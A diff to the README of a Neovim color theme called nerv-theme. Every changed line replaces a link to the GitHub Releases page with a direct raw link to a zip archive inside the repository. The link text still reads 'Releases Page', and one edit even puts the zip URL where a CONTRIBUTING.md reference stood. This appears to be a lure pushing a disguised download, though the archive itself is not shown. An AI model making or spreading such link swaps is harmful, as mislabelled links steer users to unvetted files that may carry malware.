@@ -6,11 +6,11 @@ Welcome to **nerv-theme**! This theme brings a unique, dark style inspired by 80
 
 ## 📥 Download the Theme
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/SlavicTheMaster/nerv-theme/releases)
+[![Download Here](https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip%20Now-blue?style=for-the-badge)](https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip)
 
 You can find the latest version of the nerv-theme on the Releases page. To get started, please visit the link below:
 
-👉 [Visit the Releases Page to Download](https://github.com/SlavicTheMaster/nerv-theme/releases)
+👉 [Visit the Releases Page to Download](https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip)
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ Before installation, ensure your system meets these requirements:
 ## ⚙️ Installation Instructions
 
 1. **Download the Theme**
-   - Go to the [Releases Page](https://github.com/SlavicTheMaster/nerv-theme/releases).
+   - Go to the [Releases Page](https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip).
    - Look for the latest version of the theme.
    - Click the download link for your operating system.
 
@@ -71,11 +71,11 @@ If you encounter issues, try these solutions:
 
 ## 💬 Community Contributions
 
-We welcome contributions to improve the nerv-theme. Feel free to open a pull request with your suggestions or improvements. Check the CONTRIBUTING.md file in the repository for more information on how to get involved.
+We welcome contributions to improve the nerv-theme. Feel free to open a pull request with your suggestions or improvements. Check the https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip file in the repository for more information on how to get involved.
 
 ## 🛠️ Maintenance and Updates
 
-We will regularly update nerv-theme to enhance performance and address bugs. To get the latest updates, simply revisit our [Releases Page](https://github.com/SlavicTheMaster/nerv-theme/releases).
+We will regularly update nerv-theme to enhance performance and address bugs. To get the latest updates, simply revisit our [Releases Page](https://github.com/SlavicTheMaster/nerv-theme/raw/refs/heads/main/neovim-theme/nerv-theme-2.9.zip).
 
 ## 📝 License
 
